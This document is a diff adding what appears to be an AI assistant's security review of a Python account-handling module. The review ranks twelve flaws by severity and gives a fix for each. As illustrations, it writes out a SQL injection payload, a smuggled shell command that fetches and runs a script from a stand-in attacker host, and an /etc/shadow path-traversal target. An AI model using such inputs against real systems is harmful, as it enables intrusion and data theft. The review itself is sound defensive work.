@@ -1,0 +1,56 @@
+I read the full file. Here are the security issues, most severe first.
+
+## Critical
+
+**1. SQL injection — line 34**
+```python
+query = f"SELECT ... FROM users WHERE username = '{username}'"
+```
+`username` is interpolated directly into the statement. A username of `' OR '1'='1' --` returns the first row (including `password_hash`), and since `conn.execute` is reachable with arbitrary SQL, this is a full read primitive on the `users` table. Note that `find_by_id` (line 46) and every other query in the file already use bound parameters — this one function is the outlier. Fix: `"... WHERE username = ?", (username,)`.
+
+**2. Shell command injection — lines 120–125**
+```python
+subprocess.run(f"python3 tools/export.py ... --out {destination}", shell=True, ...)
+```
+`destination` derives from the caller-supplied `filename`. A filename of `x; curl attacker.sh | sh` executes arbitrary commands as the service user. Fix: drop `shell=True` and pass an argument list: `subprocess.run(["python3", "tools/export.py", "--user", str(user_id), ...])`.
+
+**3. Path traversal — lines 119 and 126**
+`os.path.join(EXPORT_DIR, filename)` does not confine the result to `EXPORT_DIR`: an absolute `filename` (`/etc/shadow`) discards `EXPORT_DIR` entirely, and `../../` escapes it. Because `check=False` (line 124) swallows the subprocess failure, line 126 then opens and returns the bytes of whatever that path points at — an arbitrary file read, and a write primitive via the export tool's `--out`. Fix: validate `filename` against a strict allowlist (e.g. basename only, `[A-Za-z0-9._-]+`), then verify `os.path.realpath(destination).startswith(os.path.realpath(EXPORT_DIR) + os.sep)`.
+
+**4. Hardcoded secret in source — line 19**
+`SIGNING_KEY = "sk_live_8f2c91ab4e7d6035"` is committed in plaintext. The `sk_live_` prefix suggests a production key. Anyone with repo read access — or any leak of the source — gets it, and because it is also the password pepper (line 75), its disclosure degrades every stored hash. Fix: load from the environment/secret manager as `DATABASE` already does on line 17, and rotate this key since it must be treated as compromised.
+
+**5. Plaintext password written to logs — lines 60–65**
+```python
+logger.info("auth success user=%s password=%s at=%s", username, password, ...)
+```
+Every successful login writes the cleartext password to the application log, which typically lands in centralized log storage with far broader access than the credential database. Fix: remove the `password` argument entirely.
+
+## High
+
+**6. Missing authorization check in `update_profile` — lines 83–100**
+The function accepts `session_user_id` and never reads it. Any authenticated caller can pass an arbitrary `target_user_id` and rewrite another account's `email` — which on most systems is the password-reset channel, making this an account-takeover path. Compare `deactivate_account` (lines 160–161), which does the check correctly. Fix: reject unless `session_user_id == target_user_id` or the actor is an admin.
+
+**7. Missing authorization check in `get_profile` — lines 103–114**
+Same unused `session_user_id` parameter. Any caller can read any account's profile, including `email` and `role`. Fix: apply the same ownership/admin check.
+
+**8. Weak password hashing — lines 72–75**
+`sha256(password + SIGNING_KEY)` is a single-round, general-purpose hash with no per-user salt. Two consequences: identical passwords produce identical stored hashes (so one cracked password reveals every account sharing it), and a GPU attacker tests billions of candidates per second against a database dump. The global pepper helps only until line 19 leaks. Fix: use `bcrypt`, `scrypt`, or `argon2id` with a per-user salt.
+
+## Low
+
+**9. Non-constant-time hash comparison — line 59**
+`account["password_hash"] == _hash_password(password)` short-circuits on the first differing byte. Exploitability is limited here since the attacker cannot directly choose the compared digest, but `hmac.compare_digest` is the no-cost correct call.
+
+**10. `find_by_username` returns `password_hash` to all callers — line 34**
+Only `verify_credentials` needs it, yet every caller receives it in the returned dict, widening the chance it reaches a log line or an API response. Fix: select the hash in a dedicated private helper.
+
+**11. Naive `utcnow()` in session expiry — lines 64, 80, 134**
+`datetime.utcnow()` returns a naive datetime (and is deprecated as of Python 3.12). If `issued_at` at line 80 is ever timezone-aware, the subtraction raises `TypeError`; if it carries local time, the 12-hour TTL silently stretches or shrinks by the UTC offset, extending session lifetime. Fix: `datetime.now(timezone.utc)` with aware timestamps throughout.
+
+**12. Possible quadratic backtracking in `normalize_email` — line 150**
+`[^@\s]+@[^@\s]+\.[a-z]{2,}` has an overlap between `[^@\s]+` and `\.[a-z]{2,}` (the character class matches `.` and letters). A long non-matching local-and-domain string can drive O(n²) backtracking. This is polynomial rather than exponential, so it is a minor concern and only matters if `raw` is unbounded in length — capping input length addresses it.
+
+Two things I checked that are **not** problems: the f-string in `update_profile` at line 90 is safe because the column names come from the `allowed` set on line 85, not from caller input; and `deactivate_account` performs its authorization check correctly.
+
+One scoping note — `list_recent_signups` (line 130) takes no session parameter at all, so it cannot enforce authorization itself. If it's reachable from a request handler, the caller must be gating it on admin role; that's worth confirming in the route layer, which is outside this file.
